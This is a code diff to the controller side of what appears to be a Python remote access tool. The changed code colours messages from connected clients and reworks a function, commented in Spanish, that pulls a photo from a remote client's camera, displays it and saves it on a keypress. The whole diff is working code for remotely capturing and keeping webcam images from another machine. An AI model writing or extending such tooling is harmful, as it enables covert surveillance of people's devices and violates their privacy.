@@ -60,6 +60,16 @@ class TCP:
         print(Fore.GREEN + "\u250c\u2500\u2500(" + Fore.BLUE + f"{self.__userName}~{self.__hostName}" + Fore.GREEN + ")-[" + Fore.WHITE + self.__currentDir + Fore.GREEN + ']')
         print(Fore.GREEN + "\u2514\u2500" + Fore.BLUE + "> ", end='')
 
+    def printMsg(self, msg):
+        if msg[0:3] == '[+]':
+            print(Fore.GREEN + f"{self.__userName}@{self.__addr[0]}: {msg}")
+        elif msg[0:3] == '[!]':
+            print(Fore.YELLOW + f"{self.__userName}@{self.__addr[0]}: {msg}")
+        elif msg[0:3] == '[-]':
+            print(Fore.RED + f"{self.__userName}@{self.__addr[0]}: {msg}")
+        else:
+            print(Fore.WHITE + f"{self.__userName}@{self.__addr[0]}: {msg}")
+
     def parametros(self, cmd, arg1, arg2=None):
         flags = None
         if arg2 is not None and re.search(arg2, cmd):
@@ -589,36 +599,41 @@ class TCP:
     # Funcion para recibir una foto de la camara y visualizarla
     # cmd --> comando ingresado
     def pic(self, cmd):
-        flags = self.parametros(cmd, r"(\s-c[= ])", r"\s-s\s?")[1]
+        flags = self.parametros(cmd, r"(\s-c[= ])")[1]
         self.__conexion.send(cmd.encode())
 
         msg = self.__conexion.recv(1024).decode()
-        if msg[:6] != "error:":
-            self.__conexion.send("ok".encode())
-            info = self.recibirDatos()
+        self.printMsg(msg)
 
-            matriz = numpy.frombuffer(info, dtype=numpy.uint8)
-            original = cv2.imdecode(matriz, -1)
+        if msg[0:3] == '[!]':
+            return
 
-            height, width = original.shape[:2]
-            escala = self.escalar(height, width)
-            imagen = cv2.resize(original, None, fx=escala, fy=escala)
+        self.__conexion.send("ok".encode())
+        info = self.recibirDatos()
 
-            print(Fore.CYAN + "[*] Escala:", escala)
-            cv2.imshow(f"{self.__userName}@{self.__addr[0]}: Foto", imagen)
-            cv2.waitKey()
-            cv2.destroyAllWindows()
+        matriz = numpy.frombuffer(info, dtype=numpy.uint8)
+        original = cv2.imdecode(matriz, -1)
 
-            if flags:
+        height, width = original.shape[:2]
+        escala = self.escalar(height, width)
+        imagen = cv2.resize(original, None, fx=escala, fy=escala)
+
+        print(Fore.CYAN + "[*] Escala:", escala)
+        cv2.imshow(f"{self.__userName}@{self.__addr[0]}: Foto", imagen)
+
+        while True:
+            key = cv2.waitKey()
+            if key == 27:
+                break
+            if key == ord('s'):
                 if not os.path.isdir(f"{self.initDir}/pics"):
                     os.mkdir(f"{self.initDir}/pics")
                 fotoRuta = f"{self.initDir}/pics/pic{self.pics}.jpg"
                 cv2.imwrite(fotoRuta, original)
                 print(Fore.GREEN + f"[+] Foto \"{fotoRuta}\" guardada")
                 self.pics += 1
-        
-        else:
-            print(Fore.RED + f"[-] {self.__userName}@{self.__addr[0]}: {msg}")
+                break
+        cv2.destroyAllWindows()
 
     # Funcion para recibir video del cliente
     # cmd --> comando ingresado
